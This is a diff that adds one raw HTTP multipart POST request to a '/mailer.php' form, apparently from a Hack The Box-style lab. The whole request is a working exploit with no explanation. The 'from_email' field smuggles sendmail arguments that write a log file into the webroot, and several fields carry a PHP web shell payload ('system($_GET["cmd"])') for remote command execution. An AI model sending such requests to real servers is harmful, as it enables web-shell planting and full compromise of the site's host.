@@ -1,0 +1,43 @@
+POST /mailer.php HTTP/1.1
+Host: 167.99.85.216:31493
+Content-Length: 868
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://167.99.85.216:31493
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXNpaJQ4i9NBVVfel
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://167.99.85.216:31493/mailer.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: es-ES,es;q=0.9
+Connection: close
+
+------WebKitFormBoundaryXNpaJQ4i9NBVVfel
+Content-Disposition: form-data; name="from_email"
+
+ /tmp -OQueueDirectory=/tmp -X /var/www/html/phpinfo.php
+------WebKitFormBoundaryXNpaJQ4i9NBVVfel
+Content-Disposition: form-data; name="from_name"
+
+Ministry
+------WebKitFormBoundaryXNpaJQ4i9NBVVfel
+Content-Disposition: form-data; name="subject"
+
+xddd
+------WebKitFormBoundaryXNpaJQ4i9NBVVfel
+Content-Disposition: form-data; name="email_body"
+
+<?php system($_GET["cmd"]);?>
+------WebKitFormBoundaryXNpaJQ4i9NBVVfel
+Content-Disposition: form-data; name="email_list"
+
+foo@bar.com
+ds.cherry@moi.gov.htb
+<?php system($_GET["cmd"]);?>
+------WebKitFormBoundaryXNpaJQ4i9NBVVfel
+Content-Disposition: form-data; name="attachment"; filename=""
+Content-Type: application/octet-stream
+
+<?php system($_GET["cmd"]);?>
+
+------WebKitFormBoundaryXNpaJQ4i9NBVVfel--
